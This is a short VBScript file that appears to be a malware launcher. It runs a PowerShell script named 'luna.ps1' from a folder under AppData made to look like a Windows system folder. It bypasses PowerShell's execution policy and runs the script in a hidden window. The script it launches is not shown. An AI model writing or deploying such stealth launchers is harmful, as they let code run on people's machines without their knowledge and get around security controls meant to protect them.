Set shell = CreateObject("WScript.Shell")
script = """" & shell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\luna\luna.ps1") & """"
shell.Run "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File " & script, 0, False
